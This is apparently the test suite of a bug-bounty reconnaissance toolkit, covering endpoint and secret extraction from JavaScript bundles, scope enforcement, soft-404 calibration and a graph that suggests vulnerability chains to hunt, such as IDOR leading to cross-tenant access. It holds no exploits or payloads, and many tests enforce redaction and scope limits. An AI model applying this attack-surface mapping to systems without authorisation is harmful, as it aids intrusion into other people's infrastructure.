                '"filename":"https://app.acme.com/a.js?token=private"}\n',
                encoding="utf-8",
            )
            endpoints, findings = self.surface.js_surface(
                source, "https://app.acme.com", "https://app.acme.com/fallback.js")
        self.assertEqual("js:https://app.acme.com/a.js", endpoints[0].source)
        self.assertEqual("https://app.acme.com/a.js", findings[0]["js_url"])
        self.assertEqual("api-endpoint", findings[0]["finding_type"])
        self.assertNotIn("private", str(findings))

    def test_secret_reducer_never_retains_values_context_or_value_hashes(self):
        secret = "AKIAIOSFODNN7EXAMPLE"
        context_secret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / "secrets.jsonl"
            source.write_text(json.dumps({
                "kind": "AWSAccessKey",
                "data": {"key": secret, "secret": context_secret},
                "filename": "https://app.acme.com/app.js?credential=private",
                "severity": "high",
                "context": {"awsKey": secret, "awsSecret": context_secret},
            }) + "\n", encoding="utf-8")
            findings = self.surface.secret_findings(source, None)
        rendered = json.dumps(findings)
        self.assertEqual(1, len(findings))
        self.assertEqual("cloud-key", findings[0]["finding_type"])
        self.assertEqual("untriaged (scanner:high)", findings[0]["severity_hint"])
        self.assertIn("[REDACTED", findings[0]["value"])
        self.assertNotIn(secret, rendered)
        self.assertNotIn(context_secret, rendered)
        self.assertNotIn("credential=private", rendered)

    def test_secret_reducer_groups_equivalent_candidates_without_secret_material(self):
        records = [
            {"kind": "genericSecret", "data": {"value": value},
             "filename": "bundle.js", "severity": "medium"}
            for value in ("first-private-value", "second-private-value")
        ]
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / "secrets.jsonl"
            source.write_text("".join(json.dumps(record) + "\n" for record in records),
                              encoding="utf-8")
            findings = self.surface.secret_findings(
                source, "https://app.acme.com/bundle.js")
        self.assertEqual(1, len(findings))
        self.assertIn("matches=2", findings[0]["value"])
        self.assertNotIn("private-value", json.dumps(findings))

    def test_secret_candidates_from_an_out_of_scope_bundle_are_not_written(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = make_brain(tmp)
            urls = Path(tmp) / "urls.jsonl"
            secrets = Path(tmp) / "secrets.jsonl"
            urls.write_text("", encoding="utf-8")
            secrets.write_text(json.dumps({
                "kind": "genericSecret", "data": {"value": "private"},
                "filename": "https://third-party.test/sdk.js", "severity": "medium",
            }) + "\n", encoding="utf-8")
            outcome = subprocess.run(
                [str(ROOT / "tools" / "surface.py"), str(target), "js", str(urls),
                 "--secrets-file", str(secrets), "--base-url", "https://app.acme.com",
                 "--write"], capture_output=True, text=True,
            )
        self.assertEqual(1, outcome.returncode, outcome.stderr)
        self.assertIn("out-of-scope bundles", outcome.stdout)
        self.assertFalse((target / "recon" / "js-findings.md").exists())

    def test_openapi_json_normalizes_operations_without_network(self):
        spec = {
            "openapi": "3.0.0",
            "servers": [{"url": "https://api.acme.com/v2"}],
            "security": [{"bearer": []}],
            "paths": {"/orders/{id}": {"post": {
                "operationId": "updateOrder",
                "parameters": [{"name": "id", "in": "path"}],
                "requestBody": {"content": {"application/json": {
                    "schema": {"properties": {"note": {"type": "string"}}}
                }}},
            }}},
        }
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / "openapi.json"
            source.write_text(json.dumps(spec), encoding="utf-8")
            endpoints = self.surface.spec_endpoints(source, None)
        self.assertEqual(1, len(endpoints))
        self.assertEqual("https://api.acme.com/v2/orders/{id}", endpoints[0].url)
        self.assertEqual("POST", endpoints[0].method)
        self.assertEqual(("id", "note"), endpoints[0].params)
        self.assertEqual("yes", endpoints[0].auth_required)

    def test_openapi_local_schema_references_produce_parameter_names(self):
        spec = {
            "openapi": "3.0.0",
            "servers": [{"url": "https://api.acme.com"}],
            "paths": {"/orders": {"post": {"requestBody": {"content": {
                "application/json": {"schema": {"$ref": "#/components/schemas/Order"}}
            }}}}},
            "components": {"schemas": {"Order": {"properties": {
                "amount": {"type": "number"}, "coupon": {"type": "string"}
            }}}},
        }
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / "openapi.json"
            source.write_text(json.dumps(spec), encoding="utf-8")
            endpoints = self.surface.spec_endpoints(source, None)
        self.assertEqual(("amount", "coupon"), endpoints[0].params)

    def test_cli_merges_endpoints_and_global_parameters(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = make_brain(tmp)
            source = Path(tmp) / "urls.jsonl"
            source.write_text(
                '{"url":"/api/search?q=x","method":"GET","queryParams":["page"]}\n',
                encoding="utf-8",
            )
            result = subprocess.run(
                [str(ROOT / "tools" / "surface.py"), str(target), "js", str(source),
                 "--base-url", "https://app.acme.com", "--source-url",
                 "https://app.acme.com/app.js", "--write"],
                capture_output=True, text=True,
            )
            endpoints = surfacelib.read(target / "recon" / "endpoints.md")
            parameters = (target / "recon" / "parameters.txt").read_text().splitlines()
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertEqual(1, len(endpoints))
        self.assertEqual(["page", "q"], parameters)

    def test_cli_writes_redacted_findings_and_hands_off_without_inventing_surface(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = make_brain(tmp)
            urls = Path(tmp) / "urls.jsonl"
            secrets = Path(tmp) / "secrets.jsonl"
            urls.write_text(
                '{"url":"/api/orders?id=EXPR","method":"POST","type":"fetch",'
                '"queryParams":["id"],"filename":"https://app.acme.com/app.js"}\n',
                encoding="utf-8",
            )
            secrets.write_text(json.dumps({
                "kind": "GitHubToken", "data": {"token": "ghp_private_value"},
                "severity": "high", "filename": "https://app.acme.com/app.js",
            }) + "\n", encoding="utf-8")
            result = subprocess.run(
                [str(ROOT / "tools" / "surface.py"), str(target), "js", str(urls),
                 "--secrets-file", str(secrets), "--base-url", "https://app.acme.com",
                 "--write"], capture_output=True, text=True,
            )
            findings = (target / "recon" / "js-findings.md").read_text()
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertIn("handoff ready", result.stdout)
        self.assertIn("api-endpoint", findings)
        self.assertIn("GitHubToken: [REDACTED", findings)
        self.assertNotIn("ghp_private_value", findings)
        self.assertFalse((target / "attack-surface.md").exists())


class ComponentInventoryTests(unittest.TestCase):
    """Phase 23 exists because `cohort --version-lt` had no producer: phase 08's table has no
    version column, so an n-day selector had nothing to select on."""

    @classmethod
    def setUpClass(cls):
        cls.kb = load_tool("kb")

    def brain(self, d, rows):
        t = Path(d)
        (t / "index.md").write_text("# t\n", encoding="utf-8")
        (t / "recon").mkdir(exist_ok=True)
        head = ("| host | component | version | precision | reachable | evidence | confidence "
                "| source |\n|---|---|---|---|---|---|---|---|\n")
        (t / "recon/components.md").write_text(head + rows, encoding="utf-8")
        return t

    def test_a_versioned_component_becomes_a_selectable_fact(self):
        with tempfile.TemporaryDirectory() as d:
            t = self.brain(d, "| app.acme.com | pdf.js | 2.11.338 | exact | yes | x | observed | 24 |\n")
            out = self.kb.components_from_table(t)
        self.assertEqual(1, len(out))
        self.assertEqual("pdf.js 2.11.338", out[0]["object"])
        self.assertEqual("observed", out[0]["confidence"])

    def test_an_unknown_version_is_kept_but_carries_no_version(self):
        # it must NOT join a version-filtered cohort, and it must NOT vanish — a host that is
        # neither selected nor cleared is the silent cap this workspace refuses
        with tempfile.TemporaryDirectory() as d:
            t = self.brain(d, "| old.acme.com | pdf.js | unknown | unknown | ? | x | inferred | 24 |\n")
            out = self.kb.components_from_table(t)
        self.assertEqual(1, len(out))
        self.assertEqual("pdf.js", out[0]["object"])
        self.assertIsNone(self.kb._ver(out[0]["object"]))

    def test_the_template_placeholder_row_is_not_data(self):
        with tempfile.TemporaryDirectory() as d:
            t = self.brain(d, "| &lt;host&gt; | &lt;lib&gt; | 1.0 | exact | ? | x | observed | 24 |\n")
            self.assertEqual([], self.kb.components_from_table(t))

    def test_a_missing_inventory_is_empty_not_an_error(self):
        with tempfile.TemporaryDirectory() as d:
            t = Path(d)
            (t / "index.md").write_text("# t\n", encoding="utf-8")
            self.assertEqual([], self.kb.components_from_table(t))


class ChunkDiscoveryTests(unittest.TestCase):
    """Lazy chunks are recovered from saved text without executing target JavaScript."""

    @classmethod
    def setUpClass(cls):
        cls.chunks = load_tool("chunks")

    def fixture(self, root, script, source_url="https://app.acme.com/assets/app.js"):
        target = make_brain(root)
        raw = Path(root) / "raw" / "js"
        raw.mkdir(parents=True)
        bundle = raw / "app.js"
        bundle.write_text(script, encoding="utf-8")
        ledger = raw / "js-sources.tsv"
        ledger.write_text(
            "url\tartifact\tdepth\tfetch_status\n"
            f"{source_url}\tapp.js\t0\tfetched\n", encoding="utf-8")
        scope = scopelib.parse_scope(target)
        return target, raw, ledger, scope

    def edges(self, root, script, source_url="https://app.acme.com/assets/app.js"):
        _target, _raw, ledger, scope = self.fixture(root, script, source_url)
        sources = self.chunks.load_sources(ledger)
        return self.chunks.discover_graph(sources, scope).edges

    def test_literals_imports_and_source_maps_are_resolved(self):
        script = (
            'import("./lazy.js");\n'
            'const admin = "/_next/static/chunks/admin.abc123.js";\n'
            '//# sourceMappingURL=app.js.map\n'
        )
        with tempfile.TemporaryDirectory() as directory:
            urls = {edge.child_url for edge in self.edges(directory, script)}
        self.assertEqual({
            "https://app.acme.com/assets/lazy.js",
            "https://app.acme.com/_next/static/chunks/admin.abc123.js",
            "https://app.acme.com/assets/app.js.map",
        }, urls)

    def test_constrained_webpack_runtime_map_recovers_exact_filenames(self):
        script = '__webpack_require__.u=e=>e+"."+{12:"abc123",13:"def456"}[e]+".js";'
        with tempfile.TemporaryDirectory() as directory:
            edges = self.edges(directory, script)
        recovered = {(edge.child_url, edge.method, edge.confidence) for edge in edges}
        self.assertIn(("https://app.acme.com/assets/12.abc123.js",
                       "webpack-runtime-map", "high"), recovered)
        self.assertIn(("https://app.acme.com/assets/13.def456.js",
                       "webpack-runtime-map", "high"), recovered)

    def test_next_manifest_static_paths_resolve_from_next_static_root(self):
        script = 'self.__BUILD_MANIFEST={"/admin":["static/chunks/pages/admin.abc.js"]}'
        source_url = "https://app.acme.com/_next/static/build-123/_buildManifest.js"
        with tempfile.TemporaryDirectory() as directory:
            edges = self.edges(directory, script, source_url)
        self.assertEqual(["https://app.acme.com/_next/static/chunks/pages/admin.abc.js"],
                         [edge.child_url for edge in edges])

    def test_vite_dependency_paths_resolve_from_the_deployment_base(self):
        script = 'const __vite__mapDeps=(m.f||(m.f=["assets/admin.abc.js"]))'
        source_url = "https://app.acme.com/portal/assets/index.def.js"
        with tempfile.TemporaryDirectory() as directory:
            edges = self.edges(directory, script, source_url)
        self.assertEqual(["https://app.acme.com/portal/assets/admin.abc.js"],
                         [edge.child_url for edge in edges])

    def test_out_of_scope_chunks_are_recorded_but_not_candidates(self):
        script = 'const vendor = "https://cdn.example.net/vendor.js";'
        with tempfile.TemporaryDirectory() as directory:
            _target, raw, ledger, scope = self.fixture(directory, script)
            sources = self.chunks.load_sources(ledger)
            edges = self.chunks.discover_graph(sources, scope).edges
            frontier = self.chunks.write_outputs(raw, edges)
            candidates = (raw / "chunk-candidates.txt").read_text(encoding="utf-8")
        self.assertEqual("blocked-by-scope", frontier[0].scope_status)
        self.assertEqual("", candidates)

    def test_identical_content_still_resolves_against_each_parent_url(self):
        with tempfile.TemporaryDirectory() as directory:
            target, raw, ledger, scope = self.fixture(directory, 'import("./lazy.js")')
            second = raw / "second.js"
            second.write_text('import("./lazy.js")', encoding="utf-8")
            with ledger.open("a", encoding="utf-8") as source_ledger:
                source_ledger.write(
                    "https://static.acme.com/v2/app.js\tsecond.js\t0\tfetched\n")
            edges = self.chunks.discover_graph(self.chunks.load_sources(ledger), scope).edges
        self.assertEqual({
            "https://app.acme.com/assets/lazy.js",
            "https://static.acme.com/v2/lazy.js",
        }, {edge.child_url for edge in edges})

    def test_target_javascript_is_never_executed(self):
        with tempfile.TemporaryDirectory() as directory:
            marker = Path(directory) / "executed"
            script = f'require("fs").writeFileSync("{marker}", "bad"); import("./safe.js")'
            edges = self.edges(directory, script)
            self.assertFalse(marker.exists())
        self.assertEqual(["https://app.acme.com/assets/safe.js"],
                         [edge.child_url for edge in edges])

    def test_bundle_without_children_still_counts_as_analyzed_content(self):
        with tempfile.TemporaryDirectory() as directory:
            _target, _raw, ledger, scope = self.fixture(directory, "console.log(1)")
            graph = self.chunks.discover_graph(self.chunks.load_sources(ledger), scope)
        self.assertEqual(1, graph.unique_content_hashes)
        self.assertEqual((), graph.edges)

    def test_exact_discovery_outranks_a_shallower_heuristic(self):
        common = {
            "parent_url": "https://app.acme.com/runtime.js",
            "child_url": "https://app.acme.com/chunk.js",
            "bundler": "webpack",
            "scope_status": "in-scope",
            "fetch_status": "pending",
            "source_sha256": "a" * 64,
            "raw_reference": "chunk.js",
        }
        heuristic = self.chunks.GraphEdge(method="webpack-hash-map-heuristic", depth=1,
                                          confidence="medium", **common)
        exact = self.chunks.GraphEdge(method="script-literal", depth=2,
                                      confidence="high", **common)
        self.assertEqual("high", self.chunks.frontier_rows([heuristic, exact])[0].confidence)

    def test_fetched_row_requires_a_real_artifact(self):
        with tempfile.TemporaryDirectory() as directory:
            ledger = Path(directory) / "sources.tsv"
            ledger.write_text(
                "url\tartifact\tdepth\tfetch_status\n"
                "https://app.acme.com/app.js\tmissing.js\t0\tfetched\n",
                encoding="utf-8")
            with self.assertRaises(SystemExit) as refusal:
                self.chunks.load_sources(ledger)
        self.assertEqual(2, refusal.exception.code)


class DemotedFileStateTests(unittest.TestCase):
    """A file moved to the VPS by `vps-sync.py demote` is present-but-remote, never `missing`.

    `missing` is a hard preflight blocker, so before this the demote that vps-sync itself
    recommends would block every phase that needed the file.
    """

    @classmethod
    def setUpClass(cls):
        cls.dash = load_tool("dashboard")

    def _demoted(self, directory, name="subdomains.txt", lines="44485"):
        target = Path(directory)
        (target / (name + ".pointer.md")).write_text(
            f"# {name} — moved to the VPS\n\n"
            f"{lines} lines, 1.4M. Too large to reason over locally, so it\n"
            f"lives on the VPS per the split rule.\n\n"
            f"    /home/u/targets/t/recon/{name}\n\nsha256: " + "a" * 64 + "\n",
            encoding="utf-8")
        return target / name

    def test_pointer_makes_a_demoted_file_present_with_its_count(self):
        with tempfile.TemporaryDirectory() as directory:
            path = self._demoted(directory)
            self.assertEqual(("demoted", 44485), self.dash.state_of(path))

    def test_comma_formatted_pointer_count_is_parsed(self):
        with tempfile.TemporaryDirectory() as directory:
            path = self._demoted(directory, lines="1,234,567")
            self.assertEqual(("demoted", 1234567), self.dash.state_of(path))

    def test_no_pointer_is_still_missing(self):
        with tempfile.TemporaryDirectory() as directory:
            self.assertEqual(("missing", None),
                             self.dash.state_of(Path(directory) / "subdomains.txt"))

    def test_a_real_local_file_is_unaffected_by_a_stray_pointer(self):
        with tempfile.TemporaryDirectory() as directory:
            path = self._demoted(directory)
            path.write_text("a.example.com\nb.example.com\n", encoding="utf-8")
            self.assertEqual(("lines", 2), self.dash.state_of(path))

    def test_demoted_counts_as_a_satisfied_preflight_input(self):
        """The tuple preflight tests membership against must include 'demoted'.

        Asserting on the tuple specifically, not on any occurrence of the string — a bare
        `"demoted" in co_consts` would also be satisfied by the `kind == "demoted"` guard and
        so could not tell a real fix from a cosmetic one.
        """
        preflight = load_tool("preflight")
        present_sets = [c for c in preflight.check.__code__.co_consts
                        if isinstance(c, tuple) and "lines" in c and "rows" in c]
        self.assertTrue(present_sets, "could not find preflight's present-state tuple")
        for tup in present_sets:
            self.assertIn("demoted", tup,
                          "preflight must treat 'demoted' as a present input")

    def test_suggest_flows_counts_a_demoted_file(self):
        flows = load_tool("suggest-flows")
        self.assertEqual(44485, flows.n_of(("demoted", 44485)))


class RdapOrgTests(unittest.TestCase):
    """A scanner's ASN *name* is not ownership evidence. On one estate `asnmap` labelled 36 ASNs
    a provider prefix; RDAP refuted several ranges that belonged to unrelated entities or private
    individuals — whose 62 CIDRs were already in the scope allowlist."""

    @classmethod
    def setUpClass(cls):
        cls.r = load_tool("rdap-org")

    def test_org_comes_from_the_vcard_not_the_network_label(self):
        doc = {"name": "A-EXAMPLE-US9",
               "entities": [{"vcardArray": ["vcard", [["version", {}, "text", "4.0"],
                                                      ["fn", {}, "text", "Example Holdings Inc."]]]}]}
        self.assertEqual("Example Holdings Inc.", self.r.org_from_rdap(doc))

    def test_network_name_is_the_fallback(self):
        self.assertEqual("A-EXAMPLE-US9", self.r.org_from_rdap({"name": "A-EXAMPLE-US9"}))

    def test_first_entity_with_a_vcard_wins(self):
        doc = {"entities": [{"handle": "no-vcard"},
                            {"vcardArray": ["vcard", [["fn", {}, "text", "Ka Wing Tso"]]]}]}
        self.assertEqual("Ka Wing Tso", self.r.org_from_rdap(doc))

    def test_empty_and_malformed_documents_do_not_raise(self):
        for doc in ({}, {"entities": []}, {"entities": [{"vcardArray": ["vcard"]}]}, None, []):
            self.assertEqual("", self.r.org_from_rdap(doc))

    def test_a_vcard_without_a_name_falls_through(self):
        doc = {"name": "NET-1", "entities": [{"vcardArray": ["vcard", [["adr", {}, "text", "x"]]]}]}
        self.assertEqual("NET-1", self.r.org_from_rdap(doc))


class CalibrationVerdictTests(unittest.TestCase):
    """The calibration gate was enforced by preflight and satisfiable only by hand, so it read
    UNRECORDED for a whole engagement. `verdict()` is pure so the decision is testable offline."""

    @classmethod
    def setUpClass(cls):
        cls.cal = load_tool("calibrate")

    # (status, length, words, location)
    def test_404_on_improbable_paths_is_clean(self):
        base = (200, 14000, 1800, "")
        probes = [(404, 500, 40, "")] * 3
        state, why = self.cal.verdict(base, probes)
        self.assertEqual("clean", state)
        self.assertIn("status", why)

    def test_same_status_and_same_length_is_broken(self):
        """The classic soft-404: 200 for everything, one constant body."""
        base = (200, 2048, 200, "")
        probes = [(200, 2048, 200, ""), (200, 2050, 200, ""), (200, 2047, 200, "")]
        state, why = self.cal.verdict(base, probes)
        self.assertEqual("broken", state)

    def test_catch_all_body_differing_from_baseline_is_still_broken(self):
        """200 everywhere, catch-all body constant but unlike the real page — length is the
        discriminator, and the tool must say so rather than call it clean."""
        base = (200, 14000, 1800, "")
        probes = [(200, 2048, 200, ""), (200, 2049, 200, ""), (200, 2048, 200, "")]
        state, why = self.cal.verdict(base, probes)
        self.assertEqual("broken", state)
        self.assertIn("length", why)

    def test_varying_body_length_under_one_status_is_clean(self):
        base = (200, 14000, 1800, "")
        probes = [(200, 900, 90, ""), (200, 6000, 500, ""), (200, 300, 20, "")]
        self.assertEqual("clean", self.cal.verdict(base, probes)[0])

    def test_catch_all_redirect_is_broken(self):
        base = (200, 14000, 1800, "")
        probes = [(301, 0, 0, "https://x/home")] * 3
        state, why = self.cal.verdict(base, probes)
        self.assertEqual("broken", state)
        self.assertIn("redirect", why)

    def test_failed_probes_are_unknown_not_clean(self):
        """`unknown` and `clean` are different answers — a timeout is not a pass."""
        self.assertEqual("unknown", self.cal.verdict((200, 100, 10, ""), [None, None, None])[0])
        self.assertEqual("unknown", self.cal.verdict(None, [(404, 5, 1, "")] * 3)[0])

    def test_one_surviving_probe_is_not_enough(self):
        """One improbable path could collide with a real one; two must agree."""
        self.assertEqual("unknown",
                         self.cal.verdict((200, 100, 10, ""), [(404, 5, 1, ""), None, None])[0])

    def test_three_distinct_probe_paths(self):
        self.assertEqual(3, len(set(self.cal.PROBES)))


class DeclaredInputNegationTests(unittest.TestCase):
    """A role a bullet tells you NOT to use is an anti-reference, not an input.

    port-and-service-discovery reads: "`@hosts.resolved` ... - *not* `@hosts.live`, which is
    the HTTP-only set". Parsing both as required made the skill block on the very file its own
    text warns against.
    """

    @classmethod
    def setUpClass(cls):
        cls.pf = load_tool("preflight")

    def test_a_negated_role_is_not_an_input(self):
        text = ("## Inputs\n- `@hosts.resolved` (every name that resolves) — *not* "
                "`@hosts.live`, which is the HTTP-only set from `http-probing`.\n")
        roles_seen = [r for r, _p, _req, _g in self.pf.declared_inputs(text)]
        self.assertIn("@hosts.resolved", roles_seen)
        self.assertNotIn("@hosts.live", roles_seen)

    def test_other_negation_words(self):
        for word in ("never", "rather than", "instead of"):
            text = f"## Inputs\n- `@urls` — {word} `@hosts.live`.\n"
            roles_seen = [r for r, _p, _req, _g in self.pf.declared_inputs(text)]
            self.assertNotIn("@hosts.live", roles_seen, f"'{word}' should negate")
            self.assertIn("@urls", roles_seen)

    def test_negation_does_not_reach_backwards_past_its_own_clause(self):
        text = ("## Inputs\n- `@urls` from url-collection, which is the working set and the "
                "thing every later skill reads and must not be confused with anything else — "
                "not `@hosts.live`.\n")
        roles_seen = [r for r, _p, _req, _g in self.pf.declared_inputs(text)]
        self.assertIn("@urls", roles_seen)
        self.assertNotIn("@hosts.live", roles_seen)

    def test_port_discovery_scans_addresses_not_the_http_only_set(self):
        """Two invariants, both learned the hard way.

        The scan unit is the deduplicated ADDRESS, not the hostname: on one estate 35,426
        host->IP pairs collapsed to 32,245 unique IPs, and two AWS addresses carried 1,397
        hostnames between them — driving the scan off names would have probed those two 1,397
        times each. And it must never require the HTTP-only set, which would drop exactly the
        hosts this skill exists to find: a box serving only 50051, 9443, SSH or SMTP.
        """
        sf = ROOT / "skills" / "port-and-service-discovery.md"
        required = [r for r, _p, req, _g in self.pf.declared_inputs(
            sf.read_text(encoding="utf-8")) if req]
        self.assertIn("@net.ips", required, "the scan unit is the deduplicated address")
        self.assertNotIn("@hosts.live", required,
                         "the HTTP-only set would drop exactly the hosts this skill exists to find")


class ScopeCidrContainmentTests(unittest.TestCase):
    """A CIDR in scope.md must authorise the addresses INSIDE it.

    It used to be compared as a string, so `98.139.0.0/16` authorised the literal text and not one
    address within it. That killed the IP/CIDR route `phase-routing` promises: every bare IP was
    dropped as "not in scope.md", so a web service reachable only by IP could never be probed.
    """

    @classmethod
    def setUpClass(cls):
        cls.sl = load_tool("scopelib")

    def _pats(self, *lines):
        return self.sl._patterns([f"- `{l}`" for l in lines])

    def test_cidr_authorises_addresses_inside_it(self):
        pats = self._pats("98.139.0.0/16")
        self.assertTrue(self.sl.matches("98.139.145.0", pats))
        self.assertTrue(self.sl.matches("98.139.1.1", pats))

    def test_cidr_does_not_authorise_addresses_outside_it(self):
        pats = self._pats("98.139.0.0/16")
        self.assertFalse(self.sl.matches("98.140.0.1", pats))
        self.assertFalse(self.sl.matches("8.8.8.8", pats))

    def test_bare_ip_is_a_slash_32(self):
        pats = self._pats("69.147.92.11")
        self.assertTrue(self.sl.matches("69.147.92.11", pats))
        self.assertFalse(self.sl.matches("69.147.92.12", pats))

    def test_domains_are_unaffected_by_the_ip_path(self):
        pats = self._pats("*.acme.com", "10.0.0.0/8")
        self.assertTrue(self.sl.matches("login.acme.com", pats))
        self.assertFalse(self.sl.matches("evil.com", pats))

    def test_a_hostname_that_starts_with_a_digit_is_not_an_ip(self):
        """`1.2.3.4.example.com` must resolve through the DOMAIN path, not the address path."""
        pats = self._pats("*.example.com", "1.2.3.0/24")
        self.assertTrue(self.sl.matches("1.2.3.4.example.com", pats))
        self.assertFalse(self.sl.matches("1.2.3.4.evil.com", pats))

    def test_an_excluded_cidr_excludes_its_members(self):
        """An exclusion that does not contain is decorative."""
        inc, exc = self._pats("10.0.0.0/8"), self._pats("10.1.2.0/24")
        parsed = {"in_scope": inc, "out_of_scope": exc}
        self.assertTrue(self.sl.in_scope("10.9.9.9", parsed))
        self.assertFalse(self.sl.in_scope("10.1.2.5", parsed))

    def test_ipv6_does_not_match_an_ipv4_network(self):
        pats = self._pats("10.0.0.0/8")
        self.assertFalse(self.sl.matches("::1", pats))


class FileStateAgreementTests(unittest.TestCase):
    """`state_of` gates whether a phase may run; `refresh-index.sh` decides what index.md claims.
    When they disagree the manifest and the gate tell different stories — which is how phase 04
    was once cleared against an untouched `recon/dns.md` that index.md already reported as 0."""

    @classmethod
    def setUpClass(cls):
        cls.dash = load_tool("dashboard")

    TEMPLATE_DNS = (
        "# t — DNS Analysis\n\n"
        "> `dns-analysis`. A *reasoning* file, not a flat list.\n\n"
        "## Summary\n"
        "- <hosts resolved / of how many discovered>\n"
        "- <how many have CNAMEs>\n\n"
        "## Notable records\n"
        "| host | record | value |\n|---|---|---|\n\n"
        "## Email auth\n- SPF / DKIM / DMARC posture: <>\n"
    )

    def _write(self, directory, name, text):
        p = Path(directory) / name
        p.write_text(text, encoding="utf-8")
        return p

    def test_untouched_schema_template_is_empty_not_prose(self):
        with tempfile.TemporaryDirectory() as d:
            p = self._write(d, "dns.md", self.TEMPLATE_DNS)
            self.assertEqual(("empty", 0), self.dash.state_of(p))

    def test_schema_file_with_guidance_prose_is_still_empty_when_unranked(self):
        """attack-surface.md ships a page of guidance; none of it means anything is ranked."""
        text = ("# t — Attack Surface\n\n"
                "Signals: exposure, sensitivity, tech_risk. One row per candidate entrypoint.\n"
                "Leaving variants empty is allowed and is not free.\n\n"
                "| rank | entrypoint | vuln_class |\n|---|---|---|\n")
        with tempfile.TemporaryDirectory() as d:
            p = self._write(d, "attack-surface.md", text)
            self.assertEqual(("empty", 0), self.dash.state_of(p))

    def test_prose_authority_file_with_an_empty_table_stays_present(self):
        """scope.md is dense authority text that happens to carry an empty decisions table.
        Marking it empty blocks every phase on a fully-populated scope file."""
        text = ("# t — Scope Authority\n\n"
                "## Supplied scope statement\n\n"
                "Acme Inc owns acme.com and every host beneath it.\n\n"
                "## Standing decisions\n\n"
                "| date | decision | why |\n|---|---|---|\n")
        with tempfile.TemporaryDirectory() as d:
            p = self._write(d, "scope.md", text)
            self.assertEqual("prose", self.dash.state_of(p)[0])

    def test_a_filled_schema_file_counts_its_rows(self):
        text = ("# t — DNS\n\n| host | record | value |\n|---|---|---|\n"
                "| a.acme.com | A | 1.2.3.4 |\n| b.acme.com | CNAME | c.example.net |\n")
        with tempfile.TemporaryDirectory() as d:
            p = self._write(d, "dns.md", text)
            self.assertEqual(("rows", 2), self.dash.state_of(p))

    def test_rows_are_counted_across_every_table_not_just_the_first(self):
        """A reasoning file carries several tables. Counting only the first reported 5 rows for a
        recon/dns.md the manifest already said held 24."""
        text = ("# t — DNS\n\n"
                "| owner | pairs |\n|---|---|\n| a | 1 |\n| b | 2 |\n\n"
                "## Second table\n\n"
                "| host | target |\n|---|---|\n| x.a.com | y.b.net |\n| z.a.com | w.b.net |\n"
                "| q.a.com | r.b.net |\n")
        with tempfile.TemporaryDirectory() as d:
            p = self._write(d, "dns.md", text)
            self.assertEqual(("rows", 5), self.dash.state_of(p))

    def test_placeholder_only_rows_do_not_count(self):
        text = ("# t — DNS\n\n| host | record |\n|---|---|\n| <host> | <record> |\n"
                "| real.acme.com | A |\n")
        with tempfile.TemporaryDirectory() as d:
            p = self._write(d, "dns.md", text)
            self.assertEqual(("rows", 1), self.dash.state_of(p))

    def test_real_prose_beats_placeholders(self):
        self.assertFalse(self.dash.has_real_prose("- <fill this in>\n- <and this>\n"))
        self.assertTrue(self.dash.has_real_prose("- the estate runs on Apache 2.4\n"))

    def test_legend_and_fence_lines_are_not_content(self):
        self.assertFalse(self.dash.has_real_prose("`result` = not-vuln | vuln\n```\n```\n"))


class TargetGraphTests(unittest.TestCase):
    """The graph adds the vuln layer above kb.py's host trust-edge walk: it joins findings/
    hypotheses to those edges so a LOW-sev primitive (noise alone) is named as a chain seed, and a
    half-present chain names the missing half to hunt."""

    @classmethod
    def setUpClass(cls):
        cls.tg = load_tool("target-graph")

    def _brain(self, root, hyp_rows):
        t = Path(root) / "t"; (t / "findings").mkdir(parents=True)
        (t / "index.md").write_text("# t\n")
        (t / "observations.tsv").write_text(
            "date\tsubject\tpredicate\tobject\tconfidence\tsource\tevidence\n")
        head = ("| id | target | vuln_class | rationale | status | evidence_ptr |\n"
                "|---|---|---|---|---|---|\n")
        (t / "hypotheses.md").write_text("# hypotheses\n\n" + head + "".join(hyp_rows))
        (t / "attack-surface.md").write_text("| rank | entrypoint | vuln_class |\n|---|---|---|\n")
        return t

    def test_a_low_seed_primitive_is_named_as_a_chain_seed(self):
        with tempfile.TemporaryDirectory() as d:
            t = self._brain(d, ["| H-1 | a.example.com | open-redirect | x | open | ev |\n"])
            prims = self.tg.load_primitives(t)
            self.assertIn("open-redirect", prims)
            self.assertIn("open-redirect", self.tg.LOW_SEED_CLASSES)

    def test_a_present_half_names_the_missing_half(self):
        """HAVE idor-bola, MISSING multi-tenant → the cross-tenant chain is reported PARTIAL with
        the missing class named — the actionable 'go find this' output."""
        import io, contextlib
        with tempfile.TemporaryDirectory() as d:
            t = self._brain(d, ["| H-1 | api.example.com | idor-bola | x | open | ev |\n"])
            prims = self.tg.load_primitives(t)
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                self.tg.cmd_chains(t, prims)
            out = buf.getvalue()
        self.assertIn("PARTIAL", out)
        self.assertIn("idor-bola", out)
        self.assertIn("multi-tenant-isolation", out, "must name the missing half to hunt")

    def test_matches_is_loose_so_nday_nextjs_matches_the_nday_rule(self):
        self.assertTrue(self.tg.matches({"n-day-next-js"}, {"n-day"}))
        self.assertTrue(self.tg.matches({"reflected-xss"}, {"xss"}))
        self.assertFalse(self.tg.matches({"csrf"}, {"ssrf"}))

    def test_empty_brain_fails_soft_not_hard(self):
        import io, contextlib
        with tempfile.TemporaryDirectory() as d:
            t = self._brain(d, [])
            prims = self.tg.load_primitives(t)
            with contextlib.redirect_stdout(io.StringIO()):
                rc = self.tg.cmd_chains(t, prims)
            self.assertEqual(1, rc, "no primitives → exit 1, a soft fail")

    def _run_chains(self, hyp_rows, edge_rows):
        import io, contextlib
        with tempfile.TemporaryDirectory() as d:
            t = self._brain(d, hyp_rows)
            (t / "observations.tsv").write_text(
                "date\tsubject\tpredicate\tobject\tconfidence\tsource\tevidence\n" + "".join(edge_rows))
            prims = self.tg.load_primitives(t)
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                self.tg.cmd_chains(t, prims)
            return buf.getvalue()

